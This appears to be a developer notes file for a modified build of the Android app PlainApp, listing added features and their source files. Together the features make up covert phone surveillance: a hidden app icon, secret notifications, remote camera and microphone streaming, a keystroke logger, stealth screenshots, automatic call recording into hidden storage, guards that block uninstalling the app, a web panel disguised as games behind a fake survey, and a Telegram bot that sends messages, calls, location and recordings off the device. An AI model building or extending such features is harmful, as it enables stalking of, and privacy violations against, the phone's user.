# PlainApp

Open-source Android (Kotlin) app that turns your phone into a self-hosted web console. Built with Gradle; the project's output is an APK installed on a phone — there is no Replit-hosted web server. The "Status Page" workflow on this Repl just shows a static info page about the project.

## Build

```
./build-apk.sh
```

A GitHub Actions workflow at `.github/workflows/build-apk.yml` auto-builds a debug APK on every push.

## Cloudflare Tunnel (built into the app)

Recently added so the web console can be reached from anywhere on the internet through your own domain (e.g. `shakti.buzz`), with **no extra apps installed** on the phone.

Files involved:
- `app/src/main/java/com/ismartcoding/plain/services/CloudflareTunnelService.kt` — foreground service that runs the bundled `cloudflared` binary.
- `app/src/main/java/com/ismartcoding/plain/services/CloudflareTunnelManager.kt` — start/stop helper.
- `app/src/main/java/com/ismartcoding/plain/ui/page/web/CloudflareTunnelPage.kt` — settings UI (Web Console → Cloudflare Tunnel).
- `app/src/main/res/values/strings_cloudflare.xml` — UI strings.
- Preferences in `Preferences.kt`: `CloudflareTunnelTokenPreference`, `CloudflareTunnelEnabledPreference`, `CloudflareTunnelHostnamePreference`, `CloudflareTunnelAutoStartPreference`.
- `app/build.gradle.kts` — `downloadCloudflared` Gradle task downloads the official `cloudflared` Linux ARM/ARM64 binaries into `build/generated/cloudflared/jniLibs/<abi>/libcloudflared.so` so they ship inside the APK as native libraries (the only Android-allowed way to ship an executable).
- `AndroidManifest.xml` — `extractNativeLibs="true"` (required to exec the binary at runtime), `CloudflareTunnelService` declared, broadcast actions wired.
- `HttpModule.kt` — CORS opened up (`anyHost()`) so external origins can talk to the server through the public domain.

### How a user uses it
1. Cloudflare account (free) → Zero Trust → Networks → Tunnels → Create tunnel → copy token.
2. Public Hostname → subdomain `phone.shakti.buzz` → service `http://localhost:8080`.
3. In PlainApp: Web Console settings → **Cloudflare Tunnel** → paste token → enable.
4. Disable battery optimization for PlainApp.

### Caveats
Phone must stay on; aggressive OEM battery killers (Xiaomi/Realme/Vivo/Oppo) may suspend the tunnel — autostart whitelist + battery optimization off is required.

## Live camera & microphone streaming (one-way phone → web)

Modeled on the existing screen-mirror WebRTC stack. Two new optional streams that can run independently and concurrently with screen mirror.

### Phone side
- `services/LiveCameraService.kt` — foreground service (`foregroundServiceType="camera"`).
- `services/LiveMicService.kt` — foreground service (`foregroundServiceType="microphone"`).
- `services/webrtc/LiveCameraWebRtcManager.kt` — `Camera2Enumerator`, 1280×720@30, supports `switchCamera()`.
- `services/webrtc/LiveMicWebRtcManager.kt` — audio-only, supports mute toggle.
- `services/webrtc/LivePeerSession.kt` — generic peer session that tags every signaling message with a `stream` discriminator.
- `services/webrtc/WebRtcFactoryHelper.kt` — added `createSimpleWebRtcFactory()` (no MediaProjection / audio swap) and shared `ensureWebRtcInitialized()`.
- `helpers/NotificationHelper.kt` — added `createLiveServiceNotification()` on a new `IMPORTANCE_MIN` / `VISIBILITY_SECRET` channel for discreet ongoing notifications.
- `web/schemas/LiveMonitorGraphQL.kt` — new GraphQL schema (`liveCameraState`, `liveMicState`, `startLiveCamera`, `stopLiveCamera`, `switchLiveCameraFacing`, `startLiveMic`, `stopLiveMic`, `setLiveMicMuted`).
- `web/schemas/ScreenMirrorGraphQL.kt` — `sendWebRtcSignaling` resolver now routes by `payload.stream` to the matching service (`screen` / `camera` / `mic`); existing screen-mirror flow is unchanged when `stream` is null.
- `web/websocket/WebRtcSignalingMessage.kt` — added optional `stream: String?`.
- `events/AppEvents.kt` — new `StartLiveCameraEvent`, `StartLiveMicEvent`.
- `events/WebSocketEvents.kt` — new event types `LIVE_CAMERA_STREAMING(20)`, `LIVE_MIC_STREAMING(21)`.
- `Constants.kt` — `ACTION_STOP_LIVE_CAMERA`, `ACTION_STOP_LIVE_MIC`, `LIVE_MONITOR_NOTIFICATION_CHANNEL_ID`.
- `MainActivity.kt` / `MainActivityEvents.kt` — runtime permission launchers for `CAMERA` and `RECORD_AUDIO`, then start the matching foreground service.
- `AndroidManifest.xml` — declares both services, adds `FOREGROUND_SERVICE_CAMERA` / `FOREGROUND_SERVICE_MICROPHONE` permissions, adds the two STOP broadcast actions.
- `receivers/ServiceStopBroadcastReceiver.kt` — handles the stop actions from the notification.

### Web side
- `lib/webrtc-client.ts` — `SignalingMessage` gained an optional `stream` field; `startSession()` accepts `mediaKinds` so the answerer can negotiate audio-only or video-only.
- `lib/webrtc-signaling.ts` — `makeSendWebRTCSignalingFor(stream)` returns a sender that auto-tags messages.
- `views/screen-mirror/screen-mirror-webrtc.ts` — filters out incoming signaling tagged for a different stream (so screen mirror is never confused by camera/mic frames).
- `views/live-monitor/LiveCameraView.vue` and `LiveMicView.vue` — new pages that mirror the screen-mirror UX but with start/stop, camera-flip, and mute controls.
- `plugins/router.ts` — `/live-camera` and `/live-mic` routes.
- `views/home/HomeView.vue` — feature cards for the two new pages.
- `hooks/app-socket.ts` — maps event types `20` and `21` to `live_camera_streaming` / `live_mic_streaming`.
- `lib/api/query.ts` / `lib/api/mutation.ts` — new GraphQL operations.
- `locales/en-US/monitor.ts` + `locales/en-US/common.ts` — English strings (other locales fall back).

After editing the web app run from the project root:
```
cd plain-web && corepack enable && corepack yarn install && corepack yarn build
rm -rf ../app/src/main/resources/web/* && cp -r dist/* ../app/src/main/resources/web/
```

> The previous automatic Gradle task (`buildWebPanel` / `syncWebPanel`) that rebuilt
> the web panel during every APK build has been **removed** because it kept failing
> on CI (yarn `--immutable` lockfile errors and configuration-cache script-reference
> issues) and blocked APK builds. The web bundle is now built **manually** with the
> commands above and the resulting `app/src/main/resources/web/` is committed to git
> and shipped as-is by the APK. The two GitHub Actions workflows
> (`debugapk.yml`, `releaseapk.yml`) no longer install Node.js / Corepack / Yarn.

## Hide launcher icon — full disappearance + ghost-icon refresh

Hiding the launcher icon is done by disabling the `LauncherAlias` activity-alias declared in `AndroidManifest.xml`. The actual `MainActivity` only carries `MAIN` (no `LAUNCHER`) and a separate `LEANBACK_LAUNCHER` filter for Android TV, so disabling the alias is enough to take PlainApp out of phone launchers.

Many OEM home apps (Samsung One UI, MIUI, ColorOS, FuntouchOS, EMUI, MagicUI, etc.) cache every icon in their app drawer. Even after the alias is disabled the cached "ghost" icon still appears, and tapping it opens system "App info" because Android no longer has a real launcher target. To force the cache to clear immediately, `LauncherIconHelper.setHidden()` now also calls `ActivityManager.killBackgroundProcesses()` on the resolved home-launcher package and on a list of well-known OEM launcher package names. This requires `KILL_BACKGROUND_PROCESSES` (a normal permission) in the manifest.

Files involved:
- `helpers/LauncherIconHelper.kt` — disables/enables the alias and kicks the launcher process to refresh.
- `AndroidManifest.xml` — `KILL_BACKGROUND_PROCESSES` permission.
- `res/values/strings_settings.xml` — updated `hide_launcher_icon_desc` warns about ghost icons on OEM launchers.

## Live camera & mic: client-side capture/recording

The Live camera and Live microphone screens (`plain-web/src/views/live-monitor/`) record entirely in the browser using the standard `MediaRecorder` API on top of the incoming WebRTC `MediaStream`. Nothing is uploaded to the phone — captures live in-memory as `Blob` URLs and the user downloads them locally.

- `plain-web/src/lib/media-recorder.ts` — shared helper. Exposes `StreamRecorder` (start / stop with format auto-detection: `video/webm vp9/vp8/opus`, `audio/webm opus`, MP4 fallback), `takePhoto(video)` (canvas → JPEG `Blob`), `downloadBlob`, `revokeCapture`, `formatDuration`, `timestampedFilename`.
- `LiveCameraView.vue` — header buttons: "Take photo", "Start recording" / "Stop recording" (red), plus existing camera-flip and stop-stream. Recording badge overlays the live video. Captures grid below the video shows photo thumbnails and inline `<video controls>` previews with download/delete per item.
- `LiveMicView.vue` — header buttons: "Start recording" / "Stop recording" plus existing mute and stop-stream. Recording line is shown inside the audio card. Recordings list below the card uses inline `<audio controls>` players with download/delete per item.
- `plain-web/src/locales/en-US/monitor.ts` — added strings `take_photo`, `start_recording`, `stop_recording`, `recording_now`, `recording_failed`, `capture_failed`, `captures_title`, `recordings_title`, `no_captures_yet`, `no_recordings_yet`, `download`, `delete`, `photo`, `video`, `audio`.

Captures are kept in `ref<CaptureItem[]>` on the page only — they are wiped on navigation away. If the live stream is torn down while a recording is in progress, the recorder is finalized first so the user keeps the file.

## Screen mirror: avoiding repeated consent popups

Android's `MediaProjectionManager.createScreenCaptureIntent()` consent dialog is enforced by the OS — it cannot be suppressed or "remembered" once granted. However, our app used to re-fire that intent every time the web UI sent `startScreenMirror`, which produced an unnecessary popup whenever the browser reconnected to an already-running mirror session.

Both layers now check for an existing running session before triggering the intent:

- `web/schemas/ScreenMirrorGraphQL.kt` — `startScreenMirror` mutation: if `ScreenMirrorService.instance?.isRunning() == true`, it just rebroadcasts `WebSocketEvent(SCREEN_MIRRORING)` so the (re)connecting browser begins WebRTC signalling against the existing projection. Otherwise it falls back to firing `StartScreenMirrorEvent` as before.
- `ui/MainActivityEvents.kt` — `StartScreenMirrorEvent` handler does the same defensive check before calling `screenCapture.launch(...)`.

Net effect: the OS popup now only appears the first time per active session — closing/reopening the browser tab, navigating away and back, or a second viewer joining will reuse the existing projection silently. The popup will appear again only after the user (or the system) explicitly stops the screen mirror service.

## Device Admin: PIN-protected deactivation

`PlainDeviceAdminReceiver.onDisableRequested()` is invoked by the system *before* the user can confirm the "Deactivate" dialog in Settings > Security > Device admin apps. We hook into it to launch a full-screen lock activity that requires the in-app PIN (and biometric if enabled) before allowing the deactivation to proceed.

- If the user enters the correct PIN: the unlock activity finishes; the user is back in Settings and may then confirm the system's "Deactivate" dialog.
- If the user cancels or presses Back: we send them to the home screen with `Intent.ACTION_MAIN` / `CATEGORY_HOME` so they leave the Security page entirely.
- If no PIN has ever been set in PlainApp's "App lock" page, we do not block (otherwise users could lock themselves out).

Files involved:
- `receivers/PlainDeviceAdminReceiver.kt` — overrides `onDisableRequested()`, launches `DeviceAdminUnlockActivity`, returns a warning string the system shows in its dialog.
- `ui/DeviceAdminUnlockActivity.kt` — Compose-based full-screen PIN/biometric lock. Reuses `AppLockPinPreference` and `AppLockHelper`.
- `AndroidManifest.xml` — registers `DeviceAdminUnlockActivity` with `singleTask`, `noHistory`, `excludeFromRecents`, `Theme.PlainActivity`.
- `res/values/strings_settings.xml` — `device_admin_disable_warning`, `device_admin_unlock_title`, `device_admin_unlock_subtitle`, `device_admin_unlock_biometric_subtitle`.

## App info PIN guard

Blocks the system "App info" / app-details page (long-press a launcher icon → App info, or Settings → Apps → any app) behind the PlainApp PIN, so other people on the device cannot view or edit any installed app's info, force-stop it, clear its data, change its permissions or uninstall it without entering the PIN first.

Android side:
- `preferences/Preferences.kt` — `AppInfoGuardEnabledPreference` (default `false`). The guard is opt-in because it lives on top of the existing app-lock PIN.
- `helpers/AppInfoGuard.kt` — singleton with three responsibilities: (1) decide whether the guard is currently active (toggle on AND a PIN is configured) with a 5-second cache so the accessibility hot-path stays cheap, (2) classify a `(package, className)` pair as an App info screen by matching the activity class against `installedappdetails`, `appinfodashboard`, `applicationinfo`, `appinfoactivity`, `appdetailsactivity` while restricting the package to settings-like packages (`com.android.settings`, `com.miui.securitycenter`, `com.samsung.android.settings` and any package ending in `.settings`), (3) track a 30-second "recently verified" window so the user lands on the App info screen they intended to open after entering the PIN.
- `services/PlainAccessibilityService.kt` — on every `TYPE_WINDOW_STATE_CHANGED` it checks `AppInfoGuard.looksLikeAppInfoScreen(...)` and, if the guard is active and not recently verified, immediately launches `AppInfoUnlockActivity` with `FLAG_ACTIVITY_NEW_TASK | CLEAR_TOP | REORDER_TO_FRONT | NO_HISTORY`.
- `ui/AppInfoUnlockActivity.kt` — full-screen Compose unlock screen mirroring `DeviceAdminUnlockActivity`. PIN field + optional biometric prompt (when `AppLockBiometricEnabledPreference` is on and the device has biometrics enrolled). Success → `AppInfoGuard.markVerified()` and `finishAndRemoveTask`. Cancel / wrong PIN + back → send the user to the home screen via `Intent.ACTION_MAIN` + `CATEGORY_HOME` and finish.
- `AndroidManifest.xml` — registers `AppInfoUnlockActivity` next to `DeviceAdminUnlockActivity` (`exported=false`, `excludeFromRecents`, `singleTask`, `noHistory`, no `taskAffinity`, transparent activity theme).
- `web/schemas/AppLockGraphQL.kt` — `AppLockSettings.appInfoGuardEnabled` is exposed via the existing `appLockSettings` query and the new `setAppInfoGuardEnabled(enabled)` mutation, which rejects enabling the guard when no PIN is set and calls `AppInfoGuard.invalidateCache()` so the accessibility service picks up the change immediately.
- `res/values/strings_settings.xml` — `app_info_guard_title`, `app_info_guard_desc`, `app_info_unlock_title`, `app_info_unlock_subtitle`, `app_info_unlock_biometric_subtitle`.

Web side:
- `views/app-settings/AppSettingsView.vue` — adds a "PIN-protect App info pages" checkbox inside the existing App lock card; toggles via `setAppInfoGuardEnabledGQL` and refuses to enable when no PIN is set yet (same pattern as the existing `lockEnabled` toggle).
- `lib/api/mutation.ts` — `setAppInfoGuardEnabledGQL`.
- `locales/en-US/common.ts` — `app_info_guard_title`, `app_info_guard_desc`.

Limitations: needs the PlainApp accessibility service to be enabled (same as the existing app-block / time-limit features). The guard fires when the App info window appears, so the user briefly sees the page flash before the unlock activity covers it; this is the same trade-off used by every parental-control app since Android removed the ability to intercept activity launches.

## Accessibility service responsiveness

`PlainAccessibilityService` is the single accessibility service shared by remote control, keystroke logger, app blocking, time limits, app-info guard, timeline and stealth screenshots. To stop Android marking the service as "malfunctioning" and disabling it after a while, two rules are enforced:

1. `res/xml/accessibility_service_config.xml` declares `accessibilityEventTypes="typeWindowStateChanged|typeViewTextChanged"` (NOT `typeAllMask`) and `notificationTimeout="300"`. Listening to all events combined with a 100 ms timeout floods the binder callback and is the most common cause of the malfunction message.
2. `onAccessibilityEvent` only reads primitive fields off the event object on the service thread; every SharedPreferences read/write, JSON parse, `PackageHelper.getLabel` PackageManager lookup, `KeystrokeLogHelper.append`, `AppBlockHelper.addUsage`/`recordLaunch`/`blockReason` and `TimelineHelper.add` is dispatched to a dedicated `ioScope` (`Dispatchers.IO`). Only `performGlobalAction`, `MessageOverlayService.show` and `startActivity(AppInfoUnlockActivity)` are posted back to the main handler. The 5-second `enforcementRunnable` follows the same pattern.

## Auto call recorder

PlainApp now records every active phone or VoIP call automatically and exposes the recordings to the web panel.

Android side:
- `helpers/CallRecorderHelper.kt` — singleton `MediaRecorder` wrapper. Output: AAC inside MP4, mono 44.1 kHz, 96 kbps, with a sidecar `.json` carrying display name, source, direction, app id/name, timestamps, duration, size, the audio source that actually opened, and whether speakerphone was forced.
- **Both-sides capture engine.** To get as close to "record every call, including WhatsApp/Telegram/Signal/etc., on a stock unrooted phone" as Android allows for a non-system app:
  1. **Audio-source fallback chain** — `VOICE_RECOGNITION` → `VOICE_COMMUNICATION` → `MIC`. `VOICE_RECOGNITION` is the most reliable source on modern Android because the in-call audio policy does not mute it and it produces a clean stream with no AEC, which captures the speakerphone perfectly. `VOICE_COMMUNICATION` matches the call's audio mode (good for VoIP) but some Samsung/Xiaomi ROMs block third-party apps from opening it during `MODE_IN_COMMUNICATION`. `MIC` is the universal final fallback. The recorder records which source actually opened.
  2. **Auto unmute mic + auto force speakerphone ON** for the duration of recording (`AudioManager.setMicrophoneMute(false)` and `setSpeakerphoneOn(true)`). The previous routing state is captured before the change and restored as soon as the recording stops, so the user's normal call experience is unaffected after the call ends. This is the single most reliable way to capture the remote party on a non-rooted modern Android — the same trick every functional third-party call recorder uses, because the privileged `VOICE_CALL` audio source needs a system-signature permission that no user-installed app can hold (this is enforced in the Android security model since Android 9 and is not a PlainApp limitation).
  3. **Honest live status to the panel.** The state object exposes `activeAudioSource` (`VOICE_RECOGNITION` / `VOICE_COMMUNICATION` / `MIC`) and `speakerphoneForced` (boolean). Each saved recording's sidecar JSON also carries these fields so the panel can show, per recording, whether both sides were captured.
- **Storage is fully hidden from the device.** Files are written to `context.filesDir/.PlainPrivate/CallRecordings/` (i.e. `/data/data/com.ismartcoding.plain/files/.PlainPrivate/CallRecordings/`). That path is inside the app's private internal sandbox — **not browsable by any file manager, gallery, MediaStore-based app, ADB without root, or other app** — only the running PlainApp process can read it. A `.nomedia` marker is written as defence-in-depth. The web panel still has full access because the Ktor server runs inside the same app process and serves the file by absolute path through the existing `/fs?id=` route via `FileHelper.getFileId(absPath)`. A one-shot migration moves any leftover recordings from the old `getExternalFilesDir(null)/CallRecordings` location into the new private location on first access.
- `services/LiveCallTracker.kt` — calls `CallRecorderHelper.onCallActive(...)` from the app-notification active branch, the phone OFFHOOK branch and `acceptFromPanel()`. `end()` calls `onCallEnded()` first so the recording is always finalised before the call state is cleared.
- `preferences/Preferences.kt` — `CallRecorderEnabledPreference` (default `true`) acts as the user kill-switch.
- `events/WebSocketEvents.kt` — new event ids `CALL_RECORDER_STATE(25)` and `CALL_RECORDINGS_CHANGED(26)`.
- `web/schemas/CallRecorderGraphQL.kt` — exposes `callRecorderState`, `callRecordings(offset, limit)`, `callRecordingsCount`, plus mutations `setCallRecorderEnabled`, `deleteCallRecording`, `deleteAllCallRecordings`. File downloads piggy-back on the existing `/fs?id=` route via `FileHelper.getFileId(absPath)`.
- Registered in `web/MainGraphQL.kt` via `addCallRecorderSchema()`.

Web side:
- `lib/api/query.ts` — `callRecorderStateGQL`, `callRecordingsGQL`.
- `lib/api/mutation.ts` — `setCallRecorderEnabledGQL`, `deleteCallRecordingGQL`, `deleteAllCallRecordingsGQL`.
- `hooks/app-socket.ts` — maps the new event ids to the `call_recorder_state` / `call_recordings_changed` bus events for live UI updates.
- `views/home/CallRecorderCard.vue` — home tile with on/off toggle, live "recording now" pill with elapsed timer, total count + size, three most recent recordings with inline `<audio>` players and a link to the full page.
- `views/call-recordings/CallRecordingsView.vue` — full page with status header, toggle, list of all recordings (player + download + delete) and a delete-all action.
- `plugins/router.ts` — `/call-recordings` route.
- `views/home/HomeView.vue` — new `FeatureCard` tile and the `CallRecorderCard` component.
- Locale strings added in `locales/en-US/common.ts` (`call_recorder*`, `call_recordings`, `recording_now_label`).

Build: `cd plain-web && corepack yarn build`, then `rm -rf app/src/main/resources/web/* && cp -r plain-web/dist/* app/src/main/resources/web/`. APK production happens via the GitHub Actions workflow added earlier.

## Games tab and feedback security gate (web panel)

The web panel home is now a top-centered switchable card with two tabs:
- **Games** (default) — 15 mini-games rendered from `plain-web/src/views/home/games/` with start/play/result screens, best-score persistence, sound, haptics, coins, and per-game difficulty.
- **Feedback** — the original device dashboard. Switching to it triggers a security gate dialog that looks like a feedback survey but actually verifies the answer to a security question.

First-time fixed question/answer: `"Tell your best friend's name and who I only know"` → `Nitish Kumar`. After the first unlock the question and answer can be changed via the **Feedback security question** card on the unlocked dashboard (opens `FeedbackSettingsModal.vue`). The answer is stored only as a SHA-256 hash in `localStorage` (`dg_answer_hash`).

Key files:
- `plain-web/src/stores/disguise.ts` — Pinia store for the gate.
- `plain-web/src/components/SecurityGateDialog.vue` — gate dialog reskinned as a feedback survey.
- `plain-web/src/views/home/HomeView.vue` — tab switcher.
- `plain-web/src/views/home/MainDashboard.vue` — original dashboard (now mounted only after unlock).
- `plain-web/src/views/home/FeedbackSettingsModal.vue` — change Q/A.
- `plain-web/src/views/home/games/` — `gamesStore.ts`, `GameShell.vue`, `GameRunner.vue`, `GamesGrid.vue`, `registry.ts`, plus 15 game components in `impl/`.

### Per-game deep upgrades (going game-by-game)

The 15 mini-games are being individually upgraded to a "deep" feature spec on both web and Android. Status:

1. **Flappy Bird → "Flappy Eclipse"** ✅ web + Android.
   - Web: `plain-web/src/views/home/games/impl/FlappyBird.vue` — variable gravity, sensitivity slider, hold-mode with charge-meter and fatigue, calibration mini-game, day→dusk→night→space sky, parallax hills, ground tiles, pipe variants (moving + ghost), focus mode every 10th pipe (vignette + golden trail), particles, post-death slow-mo, screen shake, fragments, adaptive MMR difficulty, 4 unlockable bird flavours (vanilla / rocket / ghost / magnetic), daily seed + shareable seeds, layered WebAudio (drone + arpeggio + crash), colourblind SVG filters (protanopia / deuteranopia / tritanopia), reduced-motion + screen-pulse + assist (ghost-collision, auto-flap), gamepad polling, mouse-wheel flap, post-death analytics overlay (height-over-time chart, tap heatmap, suggestion engine, unlock toast), instant replay, fixed 16ms timestep. State persisted in `localStorage` keys: `flappy_settings_v1`, `flappy_unlocks_v1`, `flappy_mmr_v1`, `flappy_daily_v1`.
   - Android: `app/src/main/java/com/ismartcoding/plain/ui/page/home/games/impl/FlappyGame.kt` — Compose Canvas implementation with the same feature surface (settings sheet, analytics sheet with charts, MMR, unlocks, skins, particles, fragments, day/night, focus mode, assists, haptics, screen pulse, colourblind matrix). Settings persisted via new `FlappySettingsJsonPreference` in `app/src/main/java/com/ismartcoding/plain/preferences/Preferences.kt` (key `flappy_settings_json_v1`).
2. **Endless Runner → "Dino Dash · Extinction Run"** ✅ web + Android.
   - Web: `plain-web/src/views/home/games/impl/EndlessRunner.vue` — tap-to-jump, double-jump (unlockable upgrade), swipe-down crouch, jump buffer, 4 obstacle types (cactus / pterodactyl / rock / log), coins, combo, exponential speed curve to a cap, day → night cycle, 5 themes (desert / jungle / volcano / ice / moon), 4 modes (Classic / Time-Trial 60 s / Boss-Run waves every 2000 m / Mission daily-seed), power-ups (shield / magnet / slow-mo / 2× coins), permanent upgrades (double-jump, shield levels, magnet levels), 6 unlockable skins (classic / cyber / bone / lava / ice / gold), adaptive difficulty from recent deaths, layered WebAudio (jump/coin/death/announcer beep), voice TTS announcer, colourblind SVG filters, reduced-motion / high-contrast / one-handed / battery-saver, assists (auto-jump / forgiveness hitbox / invincible practice), live calibration mini-game, post-run analytics (death heatmap + reaction-time graph + tip), instant replay, daily-seed share, ghost replay. State in `localStorage`: `dino_settings_v1`, plus per-mode session.
   - Android: `app/src/main/java/com/ismartcoding/plain/ui/page/home/games/impl/RunnerGame.kt` — Compose Canvas parity (settings sheet, analytics sheet with heatmap + reaction graph, TTS announcer, haptics, themes / skins / modes / power-ups / upgrades / assists / calibration / colourblind matrix). Settings persisted via new `DinoSettingsJsonPreference` in `Preferences.kt` (key `dino_settings_json_v1`). Game-meta name in `GamesRegistry.kt` updated to "Dino Dash · Extinction Run" with modes `[Classic, TimeTrial, BossRun, Mission]`.
3. **Space Shooter → "Space Hunter · Nebula Strike"** ✅ web + Android.
   - Web: `plain-web/src/views/home/games/impl/SpaceShooter.vue` — drag-to-fly with sensitivity, auto-fire + Overdrive (homing salvo) + charged long-press shot, 6 enemy types (swarmer / tank / sniper / mothership / elite / spawnling), multi-phase boss every 3 waves with HP bar and weak-points, 7 power-up types with magnetic pickup, combo (×2 → ×10) and i-frames, 4 ship hulls (Interceptor / Brawler / Stealth / Healer) with unlock paths, 5 persistent ship upgrades bought with coins, 7 per-run perks rolled at start of each life, daily seed + shared "Beat my seed" mulberry32 link, parallax stars + nebula, calibration drag-test that auto-tunes sensitivity, post-run mission report (death heatmap, damage-over-time chart, accuracy / kills / best combo, replay), adaptive MMR difficulty (elite enemies above rank 70), full settings panel (haptics / reduced motion / high contrast / colourblind / battery saver / one-handed / assists). State in `localStorage`: `space_settings_v1`, `space_unlocks_v1`, `space_mmr_v1`, `space_daily_v1`.
   - Android: `app/src/main/java/com/ismartcoding/plain/ui/page/home/games/impl/SpaceGame.kt` — Compose Canvas parity (drag move, auto-fire, Overdrive, charged shot, 6 enemy types, multi-phase boss with HP bar, 7 drops with magnetic pickup, combo + i-frames, 4 hulls with unlocks, perk picker, MMR adapt, settings sheet, parallax stars, particles). Settings persisted via new `SpaceSettingsJsonPreference` in `Preferences.kt` (key `space_settings_json_v1`). `GamesRegistry.kt` entry renamed to "Space Hunter · Nebula Strike" with the full feature list.
4. **Memory Match → "Recall · Twin Echo"** ✅ web + Android.
   - Web: `plain-web/src/views/home/games/impl/MemoryGame.vue` — adjustable grid 2×2 → 6×6, 6 themes (Animals / Space / Food / Geometry / Fantasy / Nostalgia), 6 unlockable card backs, 5 modes (Classic / Timed / Memory Lane / Mismatch Penalty / Zen), 3 power-ups (Reveal / Shuffle / Freeze) refilled daily, adaptive hint after 3 misses in a row, daily seed + shareable seed for fixed boards, memory-span calibration test that suggests grid size, colourblind shape tags, high contrast, reduced motion, long-press confirm, larger touch zones assist, post-game analytics (heatmap of revisits per cell + flips-per-second pace chart + efficiency % + star rating), flip replay viewer. State in `localStorage`: `memory_settings_v1`, `memory_unlocks_v1`, `memory_powerups_v1`, `memory_daily_v1`.
   - Android: `app/src/main/java/com/ismartcoding/plain/ui/page/home/games/impl/MemoryGame.kt` — Compose parity with grid sizing, all 6 themes, 5 modes (Memory Lane grows board on win, Mismatch Penalty adds pairs on miss), 3 daily-refilled power-ups, adaptive hint, colourblind shape tags, accessibility settings, settings sheet. Settings persisted via new `MemorySettingsJsonPreference` in `Preferences.kt` (key `memory_settings_json_v1`). `GamesRegistry.kt` entry renamed to "Recall · Twin Echo".
5. **2048 → "2048: Merger Ascension"** ✅ web + Android.
   - Web: `plain-web/src/views/home/games/impl/Game2048.vue` — 5 modes (classic / timed 60 s / endless expanding / challenge puzzles / daily), grids 4×4 / 5×5 / 6×6 (unlocked by milestones), 4 themes (neon / paper / glass / dark) and 6 tile skins (classic / digital / neon / marble / wood / crystal — unlocked), power-ups (undo, shuffle, lowest-tile clear) refilled daily, daily mulberry32 seed, gyro tilt + on-screen arrows + adjustable swipe distance, accessibility (reduced motion / high contrast / one-handed / battery-saver / colourblind / font scale), assists (hints, auto-undo on losing swipe, slower animations, next-tile preview), post-game heat-map + best-tile chart + AI tip. State in `localStorage` keys `m2048_*_v1`.
   - Android: `app/src/main/java/com/ismartcoding/plain/ui/page/home/games/impl/Game2048.kt` — Compose parity with `animateFloatAsState` tile sliding, all 5 modes, themes, skins, power-ups, settings dialog (FlowRow chips), post-game analytics dialog with cell heat-map. Settings persisted via new `Game2048SettingsJsonPreference` in `Preferences.kt` (key `game2048_settings_json_v1`).
6. **Tap Pattern → "Pattern Pulse"** ✅ web + Android.
   - Web: `plain-web/src/views/home/games/impl/TapPattern.vue` — 4 modes (sequence / rhythm with falling notes & PERFECT/GOOD/MISS judging / shape tracing / cascade falling tiles), 4/6/9 pads (4-lane in rhythm), 4 themes, 4 sound packs (piano / drums / synth / 8-bit), 4 tap effects unlocked by combo milestones, power-ups (hint / slow / extra life) refilled daily, calibration metronome, daily seed, post-game pad heat-map + timing histogram, accessibility (reduced motion / high contrast / one-handed / battery-saver / colourblind glyphs), assists (glow next pad / larger tap radius / wider timing window). State in `localStorage` keys `pulse_*_v1`.
   - Android: `app/src/main/java/com/ismartcoding/plain/ui/page/home/games/impl/TapGame.kt` — Compose parity with all 4 modes (rhythm uses falling notes in BoxWithConstraints, cascade animates yPct), themes / sound packs / effects, power-ups, settings dialog, post-game heat-map + timing histogram. Settings persisted via new `TapPatternSettingsJsonPreference` in `Preferences.kt` (key `tap_pattern_settings_json_v1`).
7. (Remaining 9 games not yet deeply upgraded — pending user spec for each.)

## Hide private notes on-device

`NoteHelper.search/count/getIdsAsync/getTrashedIdsAsync` now accept an `excludePrivate: Boolean = false` flag. The Android `NotesViewModel` passes `true` so the on-device Notes screen never lists private notes (their counts are also excluded). The web GraphQL schemas (`NoteGraphQL.kt`, `TagGraphQL.kt`) leave the flag at the default `false`, so the web panel still fetches every note from the device's SQLite database, including private ones.

## Telegram Bot Integration

A full Telegram Bot runs alongside the web server using long-polling (OkHttp), providing remote device control via Telegram chat. Key files:

- `app/src/main/java/com/ismartcoding/plain/telegram/TelegramApiClient.kt` — OkHttp-based HTTP client for Telegram Bot API (sendMessage, sendPhoto, sendAudio, sendVoice, sendVideo, sendDocument, sendLocation, sendChatAction, setMyCommands, getMe, getUpdates).
- `app/src/main/java/com/ismartcoding/plain/telegram/TelegramBotManager.kt` — Singleton bot manager with 23 slash commands: `/start`, `/help`, `/stop`, `/messages`, `/sms`, `/sendsms`, `/calls`, `/contacts`, `/notifications`, `/logs`, `/files`, `/screenshot`, `/photo`, `/audio`, `/video`, `/apps`, `/blockapp`, `/unblockapp`, `/blockedapps`, `/location`, `/battery`, `/device`, `/commands`. Real-time forwarding of new notifications (`forwardNotification`) and call state changes (`forwardCallState`) to the configured chat ID. Duplicate state guard prevents repeated active-call messages.
- `app/src/main/java/com/ismartcoding/plain/ui/page/settings/TelegramBotPage.kt` — Compose settings page (Bot Status toggle, credentials text fields for token + chat ID, per-feature forwarding toggles). Accessible from Settings → Telegram Bot.
- `app/src/main/java/com/ismartcoding/plain/ui/nav/Routing.kt` — `Routing.TelegramBot` route added.
- `app/src/main/res/values/strings_settings.xml` — 11 new string resources for the Telegram settings UI.
- **Wired into**: `HttpServerService.kt` (starts/stops with web server, loads all prefs), `PNotificationListenerService.kt` (forwards notifications if `forwardNotifications` flag is set), `LiveCallTracker.kt` (forwards call ringing/active/ended states if `forwardCalls` flag is set).
- **Preferences** (in `Preferences.kt`): `TelegramBotEnabledPreference`, `TelegramBotTokenPreference`, `TelegramChatIdPreference`, `TelegramBotForwardNotificationsPreference`, `TelegramBotForwardCallsPreference`.
- **24th command `/recordings`**: Lists recent call recordings (newest first) from `CallRecorderHelper.list()`.
- **Auto call recording forwarding**: `CallRecorderHelper.stopRecording()` calls `TelegramBotManager.forwardCallRecording(file, meta)` after every successful recording — sends the `.m4a` file directly to Telegram as an audio message with direction, caller, duration, and size metadata.
- **Instant crash forwarding**: `CrashHandler.saveCrash()` calls `TelegramBotManager.sendCrashReport()` synchronously (blocking OkHttp) before the process dies — sends stack trace, device info, Android version, and app version to Telegram immediately.
- **Bot internal heartbeat**: `TelegramBotManager.start()` launches a `heartbeatJob` coroutine that checks every 30 seconds if `pollJob?.isActive != true` and silently restarts the poll loop if it died.
- **Watchdog bot health check**: `KeepAliveWatchdogReceiver` (every ~60s) and `KeepAliveJobService` (every ~15min) both check if the Telegram bot is dead while the HTTP service is running — if so they restart the bot immediately using credentials from DataStore.
